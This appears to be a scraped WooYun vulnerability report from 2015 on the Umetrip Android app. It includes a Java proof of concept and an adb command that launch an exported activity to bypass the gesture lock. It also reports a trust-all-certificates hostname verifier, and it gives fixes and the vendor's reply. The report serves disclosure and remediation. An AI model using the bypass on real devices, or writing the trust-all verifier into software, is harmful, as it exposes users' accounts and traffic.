{"id": 7423, "wybug_id": "wooyun-2015-0111692", "wybug_title": "航旅纵横手势锁轻易绕过及其它漏洞", "wybug_corp": "航旅纵横", "wybug_author": "小荷才露尖尖角", "wybug_date": "2015-05-12 16:46", "wybug_open_date": "2015-08-10 18:24", "wybug_type": "非授权访问/认证绕过", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端程序设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向公众公开  简要描述： 由于没有正确实现，安全功能成了摆设 详细说明：  测试版本：航旅纵横android客户端v2.5.5，最新版本1、该版本可以设置手势锁功能来对本地用户进行认证，然而该功能却可以通过启动导出的activity轻易绕过。利用POC如下：\npublic void activityStart(View v) {\t\tComponentName componetName = new ComponentName(\"com.umetrip.android.msky.app\",\"com.umetrip.android.msky.activity.MainActivity\");\t\ttry {\t\t\tIntent intent = new Intent();\t\t\tintent.setComponent(componetName);\t\t\tstartActivity(intent);\t\t} catch (Exception e) {\t\t\tToast.makeText(getApplicationContext(), \"Not found\", 0).show();\t\t}\t}\n或者直接在adb shell中使用am进行测试\nam start com.umetrip.android.msky.app/com.umetrip.android.msky.activity.MainActivity\n2、反编译发现存在多处信任所有证书漏洞，易遭受中间人攻击。   漏洞证明：  1、手势锁绕过正常情况下，需要解开手势锁后登录\n\n启动com.umetrip.android.msky.activity.MainActivity\nshell@klte:/ $ am start com.umetrip.android.msky.app/com.umetrip.android.msky.>Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.umetrip.android.msky.app/com.umetrip.android.msky.activity.MainActivity }\n绕过手势锁，进入已登录账户的界面\n\n2、信任所有证书com.umetrip.android.msky.f.a.l类：使用\nsetHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER)\n信任所有证书\n\n   修复方案：  1、默认手势锁解开以后的其他activity为非导出状态，或者使用权限保护。2、建议使用setHostnameVerifier(SSLSocketFactory.STRICT_HOSTNAME_VERIFIER)，详见\nhttp://drops.wooyun.org/tips/3296#more-3296\n   版权声明：转载请注明来源 小荷才露尖尖角@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-05-12 18:24 厂商回复： 非常感谢，会尽快恢复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-12 17:20 |    \t\tze0r \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | ..)\t\t \n  用ADB操作也算漏洞么。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}